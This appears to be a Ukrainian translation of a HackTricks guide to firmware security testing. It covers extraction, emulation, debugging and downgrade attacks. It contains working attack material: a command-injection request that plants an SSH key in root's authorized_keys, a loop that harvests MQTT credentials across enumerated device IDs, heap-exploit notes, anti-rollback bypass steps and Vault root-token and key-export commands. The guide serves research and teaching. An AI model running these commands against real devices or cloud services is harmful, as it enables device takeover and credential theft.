# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов’язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Прошивка — це essential software, що забезпечує коректну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі, і сприяючи їй. Вона зберігається в постійній пам’яті, завдяки чому пристрій отримує доступ до важливих інструкцій одразу після ввімкнення, що призводить до запуску операційної системи. Дослідження та потенційна модифікація прошивки є критично важливим етапом для виявлення security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — це критично важливий початковий етап для розуміння структури пристрою та технологій, які він використовує. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну структуру та datasheets
- Метрики codebase і розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і regulatory certifications
- Архітектурні діаграми та діаграми flow
- Security assessments і виявлені vulnerabilities

Для цього надзвичайно корисними є інструменти **open-source intelligence (OSINT)**, як і аналіз усіх доступних компонентів open-source software за допомогою ручних та автоматизованих процесів перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний static analysis, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Отримати прошивку можна різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** з джерела (розробників, виробників)
- **Зібравши** її за наданими інструкціями
- **Завантаживши** з офіційних сайтів підтримки
- Використовуючи запити **Google dork** для пошуку розміщених файлів прошивки
- Отримуючи прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплюючи **оновлення** за допомогою man-in-the-middle techniques
- **Видобуваючи** її з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехоплюючи** запити на оновлення під час комунікації пристрою
- Виявляючи та використовуючи **hardcoded update endpoints**
- **Знімаючи дамп** із bootloader або мережі
- **Виймаючи та зчитуючи** storage chip, коли все інше не допомагає, за допомогою відповідних hardware tools

### Логи лише через UART: примусове отримання root shell через U-Boot env у flash

Якщо UART RX ігнорується (доступні лише логи), все одно можна примусово запустити init shell, **відредагувавши blob середовища U-Boot** offline:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою SOIC-8 clip і programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть розділ U-Boot env, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 U-Boot env** для blob.
3. Перезапишіть лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для embedded devices, де shell bootloader вимкнено, але до env partition можна отримати доступ для запису через зовнішній flash access.

## Аналіз прошивки

Тепер, коли у вас **є прошивка**, потрібно видобути інформацію про неї, щоб зрозуміти, як із нею працювати. Для цього можна використовувати різні інструменти:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих інструментів не вдалося знайти багато інформації, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька, малоймовірно, що образ зашифрований. Якщо ентропія висока, ймовірно, образ зашифрований (або певним чином стиснений).

Крім того, ви можете використовувати ці інструменти для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для перевірки файлу.

### Отримання файлової системи

За допомогою описаних вище інструментів, таких як `binwalk -ev <bin>`, ви повинні були отримати можливість **вилучити файлову систему**.\
Binwalk зазвичай вилучає її в **папку, названу за типом файлової системи**, яким зазвичай є один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне вилучення файлової системи

Іноді binwalk **не має magic byte файлової системи у своїх сигнатурах**. У таких випадках використовуйте binwalk, щоб **знайти offset файлової системи та вирізати стиснену файлову систему** з бінарного файлу, а потім **вручну вилучити** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Виконайте наведену нижче **команду dd**, щоб вилучити файлову систему Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати наведену нижче команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо дослідити його структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу й вилучення цінних даних з образу firmware.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкової перевірки бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, вилучити рядки, проаналізувати бінарні дані та зрозуміти структуру розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють його **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти та ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто до каталогу, названого на честь типу файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне вилучення. Воно передбачає використання `binwalk` для визначення зміщення файлової системи, після чого команда `dd` застосовується для вилучення файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовуються різні команди.

### Аналіз файлової системи

Після вилучення файлової системи починається пошук вразливостей безпеки. Особлива увага приділяється небезпечним мережевим daemon, hardcoded credentials, API endpoints, функціям update server, нескомпільованому коду, startup scripts і скомпільованим binary для offline analysis.

**Ключові розташування** та **елементи**, які слід перевірити:

- **etc/shadow** і **etc/passwd** для облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на предмет потенційних вразливостей
- Вбудовані binary для подальшого аналізу
- Поширені web servers і binary IoT-пристроїв

Кілька інструментів допомагають виявляти конфіденційну інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static і dynamic analysis

### Перевірки безпеки скомпільованих binary

І вихідний код, і скомпільовані binary, знайдені у файловій системі, необхідно ретельно перевірити на наявність вразливостей. Такі інструменти, як **checksec.sh** для Unix binary і **PESecurity** для Windows binary, допомагають виявляти незахищені binary, які можуть бути використані для exploitation.

## Отримання cloud config і MQTT credentials через похідні URL tokens

Багато IoT hubs отримують конфігурацію для кожного пристрою з cloud endpoint, який має вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально виводиться з ідентифікатора пристрою за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді uppercase hex

Ця конструкція дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і отримати cloud config, яка часто розкриває plaintext MQTT credentials і topic prefixes.

Практичний workflow:

1) Витягніть deviceId з UART boot logs

- Підключіть UART-адаптер 3.3V (TX/RX/GND) і перехопіть logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять шаблон URL хмарної конфігурації та адресу брокера, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновіть STATIC_KEY та алгоритм token із firmware

- Завантажте бінарні файли в Ghidra/radare2 і виконайте пошук шляху конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть token у Bash і перетворіть digest на верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збір cloud config та облікових даних MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; обробіть його за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживання MQTT у відкритому тексті та слабкими ACL для topic (якщо наявні)

- Використовуйте отримані облікові дані, щоб підписатися на topics технічного обслуговування та шукати конфіденційні події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перелічуйте передбачувані ідентифікатори пристроїв (у великих масштабах, з дозволом)

- У багатьох екосистемах використовуються байти OUI виробника, продукту й типу, за якими слідує послідовний суфікс.
- Ви можете перебирати потенційні ідентифікатори, отримувати tokens і програмно завантажувати конфігурації:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробою масового перерахування.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання secrets без модифікації цільового hardware.

Процес емуляції firmware дає змогу виконувати **dynamic analysis** роботи пристрою або окремої програми. Цей підхід може зіткнутися з проблемами, пов'язаними із залежностями від hardware або architecture, але перенесення root filesystem або окремих binaries на пристрій із відповідною architecture та endianness, наприклад Raspberry Pi, або до заздалегідь підготовленої virtual machine, може сприяти подальшому тестуванню.

### Емуляція окремих binaries

Для дослідження окремих програм важливо визначити endianness і CPU architecture програми.

#### Приклад із MIPS Architecture

Щоб емулявати binary для MIPS architecture, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для binary з little-endian слід використовувати `qemu-mipsel`.

#### Емуляція ARM Architecture

Для ARM binary процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Full System Emulation

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизуючи процес і допомагаючи у dynamic analysis.

## Dynamic Analysis на практиці

На цьому етапі для аналізу використовується реальне або емульоване середовище пристрою. Важливо зберігати shell-доступ до OS і файлової системи. Емуляція може не повністю відтворювати взаємодію з hardware, тому іноді може знадобитися перезапуск емуляції. Аналіз має охоплювати повторне дослідження файлової системи, експлуатацію відкритих вебсторінок і мережевих сервісів, а також пошук вразливостей bootloader. Тести цілісності firmware мають вирішальне значення для виявлення потенційних backdoor-вразливостей.

## Runtime Analysis Techniques

Runtime analysis передбачає взаємодію з процесом або binary у його робочому середовищі з використанням таких інструментів, як gdb-multiarch, Frida і Ghidra, для встановлення breakpoint і виявлення вразливостей за допомогою fuzzing та інших технік.

Для embedded targets без повноцінного debugger **скопіюйте статично скомпонований `gdbserver`** на пристрій і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Відображення повідомлень Zigbee / radio-co-processor

В IoT-хабах RF-стек часто розділений між **radio MCU** і процесом Linux userland. Корисний робочий процес — відобразити такий шлях:<sup>[[8]](#references)</sup>

1. **RF frame** у радіоефірі
2. **controller-side parser** на radio MCU
3. **serial/UART text or TLV protocol**, що пересилається до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** в основному daemon
5. **protocol-specific handler / state machine**

Така архітектура створює дві цілі для reversing замість однієї. Якщо controller перетворює бінарні радіокадри на текстовий протокол, наприклад `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які повідомлення можуть надходити з **network**, а які — безпосередньо від controller
- Точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers доступні лише під час **commissioning**, discovery або етапів завантаження firmware/model

Для Zigbee перехопіть pairing traffic і перевірте, чи target досі використовує стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цей ризик, тому зафіксуйте, чи тестований device справді їх enforcing.

### Manufacturer-specific protocol handlers і FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою target, ніж standardized clusters, оскільки вони передають дані до **custom parsing code** і внутрішніх **FSMs** з менш перевіреною часом валідацією.<sup>[[8]](#references)</sup>

Практичний workflow:

- Виконуйте reversing command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, які автоматично переходять далі, а також retry/error branches, що зрештою виконують reset або звільняють state, контрольований attacker.
- Підтвердьте, які легітимні protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди доступний.

Для timing-sensitive protocols replay пакетів із Python framework може бути надто повільним. Надійніший підхід — емулювати легітимний device на реальному hardware (наприклад **nRF52840**) за допомогою vendor-grade stack, щоб можна було надати правильні **endpoints**, **attributes** і commissioning timing.

### Клас fragmented-download bug в embedded daemons

Повторюваний клас firmware bug виникає у **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) зберігає `ctx->total_size` і виділяє `malloc(total_size)`.
2. Наступні fragments перевіряють лише контрольовані attacker **packet-local** fields, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки відносно **original allocated size**.

Це дає attacker змогу надіслати:

- Перший коректний fragment із **small** declared total size, щоб примусово виконати мале heap allocation.
- Наступний fragment із **expected offset**, але більшим `chunk_len`.
- Підроблений packet-local size, який проходить свіжі перевірки, водночас спричиняючи overflow спочатку виділеного buffer.

Якщо vulnerable path розташований за commissioning logic, exploitation має включати достатню **device emulation**, щоб перевести target у потрібний model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростіший спосіб запустити heap metadata exploitation часто полягає не в тому, щоб "wait for cleanup", а в тому, щоб **force the protocol's own error handling**:<sup>[[8]](#references)</sup>

- Надсилайте malformed follow-up fragments, щоб перевести FSM у **retry** або **error** states.
- Перевищте retry threshold, щоб daemon виконав **resets context** і звільнив corrupted buffer.
- Використовуйте цей передбачуваний `free()`, щоб запустити allocator-side primitives до того, як process завершиться з інших причин.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де пошкодження chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний підхід — пошкодити **size field**, щоб перенаправити allocator traversal до **fake chunks**, розміщених усередині overflowed buffer, замість негайного перезапису реальних bin pointers і crash process.

## Binary Exploitation і Proof-of-Concept

Розробка PoC для виявлених vulnerabilities потребує глибокого розуміння архітектури target і програмування мовами нижчого рівня. Binary runtime protections в embedded systems трапляються рідко, але якщо вони присутні, можуть знадобитися такі techniques, як Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніше large allocation може запустити `__malloc_consolidate()`, тому будь-який fake chunk має пройти перевірки (sane size, `fd = 0` і сусідні chunks мають сприйматися як "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але main binary є **non-PIE**, адреси `.data/.bss` усередині binary стабільні. Можна націлитися на region, який уже нагадує коректний heap chunk header, щоб розмістити fastbin allocation на **function pointer table**.
- **Parser-stopping NUL:** під час парсингу JSON `\x00` у payload може зупинити parsing, зберігши кінцеві attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити executable shellcode у відомому mapping і перейти до нього.

## Підготовлені Operating Systems для Firmware Analysis

Operating systems, як-от [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS), надають попередньо налаштовані environments для firmware security testing, оснащені необхідними tools.

## Підготовлені OSs для аналізу Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — це distro, призначений для security assessment і penetration testing Internet of Things (IoT) devices. Він заощаджує багато часу, надаючи попередньо налаштований environment із завантаженими всіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): operating system для embedded security testing на базі Ubuntu 18.04, попередньо оснащений tools для firmware security testing.

## Firmware Downgrade Attacks і Insecure Update Mechanisms

Навіть коли vendor реалізує cryptographic signature checks для firmware images, **version rollback (downgrade) protection часто відсутній**. Якщо boot- або recovery-loader лише перевіряє signature за допомогою вбудованого public key, але не порівнює *version* (або monotonic counter) image, що прошивається, attacker може легітимно встановити **старішу, vulnerable firmware, яка все ще має valid signature**, і таким чином повторно активувати patched vulnerabilities.<sup>[[4]](#references)</sup>

Типовий attack workflow:

1. **Отримайте старішу signed image**
* Завантажте її з public download portal, CDN або support site vendor.
* Витягніть її з companion mobile/desktop applications (наприклад, з Android APK у `assets/firmware/`).
* Отримайте її зі сторонніх repositories, таких як VirusTotal, Internet archives, forums тощо.
2. **Upload або serve image на device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато consumer IoT devices надають *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх server-side і запускають recovery/upgrade.
3. Після downgrade exploit vulnerability, яку було patched у новішому release (наприклад, command-injection filter, доданий пізніше).
4. За потреби прошийте latest image назад або disable updates, щоб уникнути detection після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) версії firmware параметр `md5` безпосередньо конкатенується з shell command без sanitisation, що дає змогу ін'єктувати довільні команди (у цьому випадку — увімкнути root-доступ через SSH keys). У пізніших версіях firmware було додано базовий character filter, але відсутність downgrade protection робить це виправлення марним.<sup>[[4]](#references)</sup>

### Витягування Firmware із Mobile Apps

Багато vendors вбудовують повні firmware images у свої companion mobile applications, щоб app могла оновлювати пристрій через Bluetooth/Wi-Fi. Ці packages зазвичай зберігаються без encryption в APK/APEX за такими paths, як `assets/fw/` або `res/raw/`. Такі tools, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягнути підписані images без фізичного доступу до hardware.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Обхід anti-rollback лише через updater у конструкціях зі слотами A/B

Деякі vendors реалізують anti-downgrade **ratchet**, але лише всередині логіки *updater* (наприклад, UDS routine через CAN, recovery command або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише image signature/CRC і довіряє partition table або slot metadata, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Firmware metadata містить як version descriptor, так і **security ratchet** / монотонний лічильник.
- Updater порівнює image ratchet зі значенням, збереженим у persistent storage, і відхиляє старіші signed images.
- Bootloader **не** розбирає цей ratchet і перед boot перевіряє лише header, CRC та signature.
- Активація slot зберігається окремо в partition table або per-slot generation counter і **не прив'язана криптографічно** до точного firmware digest, який пройшов validation.

Це створює primitive **validate-one-image / boot-another-image** у dual-slot systems. Якщо attacker може змусити updater позначити slot B як наступну boot target за допомогою current signed image, а потім перезаписати slot B до reboot, bootloader все одно може bootнути downgraded image, оскільки довіряє лише вже committed slot metadata.

Поширений abuse pattern:

1. Завантажити **current signed** firmware у passive slot і виконати звичайну validation/switch routine, щоб layout позначив цей slot як next active.
2. **Поки що не виконувати reboot**. У тій самій session повторно увійти в slot-preparation/erase routine.
3. Використати stale boot-state або stale slot-selection logic, щоб updater стер **той самий physical slot**, який щойно було promoted.
4. Записати **старішу, але все ще signed** firmware у цей slot.
5. Пропустити validation routine, яка застосовує ratchet, і виконати reboot напряму.
6. Bootloader вибирає promoted slot, перевіряє лише signature/integrity і boot-ить старий image.

Під час reverse engineering A/B update implementations звертайте увагу на таке:

- Slot selection, що визначається **boot-time flags**, які не оновлюються після успішного switch.
- Routine на кшталт `prepare_passive_slot()`, яка стирає slot на основі stale state, а не **поточного committed layout**.
- Function на кшталт `part_write_layout()`, яка лише збільшує **generation counter** / active flag і не зберігає validated image hash.
- Ratchet checks, реалізовані в userspace або updater code, але **не** в ROM / bootloader / secure boot stages.
- Erase або recovery routines, які залишають slot позначеним як bootable навіть після видалення та перезапису його вмісту.

### Checklist для оцінювання Update Logic

* Чи достатньо захищені transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **monotonic anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи **bootloader застосовує той самий ratchet**, що й updater, замість перевірки лише signature/CRC?
* Чи **slot activation metadata прив'язана до validated firmware digest/version**, або slot можна змінити після promotion?
* Після успішного switch slot device примусово виконує reboot, чи подальші update/erase routines усе ще доступні в тій самій session?
* Чи виконує userland code додаткові sanity checks (наприклад, allowed partition map, model number)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡  Якщо будь-який із наведених пунктів відсутній, platform, імовірно, вразлива до rollback attacks.

## Vulnerable firmware для практики

Щоб практикувати пошук vulnerabilities у firmware, використовуйте наведені нижче vulnerable firmware projects як starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Відновлення ключів розшифрування firmware зі стану вбудованих KMS/Vault

Коли update image поєднує невеликі plaintext metadata з великим high-entropy blob, спочатку виконайте container triage, а не brute-forcing:<sup>[[1]](#references)</sup>

- Dump-айте headers, offsets і line boundaries за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` та `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 bytes є salt, а решта bytes — ciphertext.
- Base64 field, який після decoding має рівно `256` bytes, є вагомою ознакою того, що ви маєте справу з RSA-2048 ciphertext, який обгортає random firmware password/session key.
- Detached PGP material у тому самому файлі часто захищає лише authenticity; не припускайте, що це mechanism confidentiality.

Якщо static key hunting (`grep`, `strings`, пошук PEM/PGP) не дає результатів, reverse engineer-те **operational decrypt path**, а не лише шукайте private keys:

- Decompile-те updater / management binary і простежте, хто читає encrypted blob, який helper/API його unwrap-ає та яке logical key name він запитує.
- Шукайте у витягнутій root filesystem KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit files та init scripts.
- Розглядайте plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens або локальні KMS auto-unseal scripts як еквівалент private-key material.

Якщо appliance постачається з оригінальним Vault binary та storage backend, replay цього environment зазвичай простіший, ніж reimplementing Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Маючи root на клонованому KMS:

- Зробіть transit keys експортованими лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте unwrap key: `vault read transit/export/encryption-key/<name>`
- Перевірте відновлений RSA key з точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала стандартна розшифровка OAEP **не** доводять, що key неправильний; багато потоків на базі Vault використовують OAEP із SHA-256, тоді як поширені libraries за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть vendor's OpenSSL KDF (`EVP_BytesToKey`, часто MD5 на legacy appliances), перш ніж виконувати AES-CBC decryption.

Це перетворює "encrypted firmware" на більш загальну проблему: **відновити operational keys на стороні appliance, а потім офлайн відтворити точні параметри unwrap + KDF**.

## Навчання та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
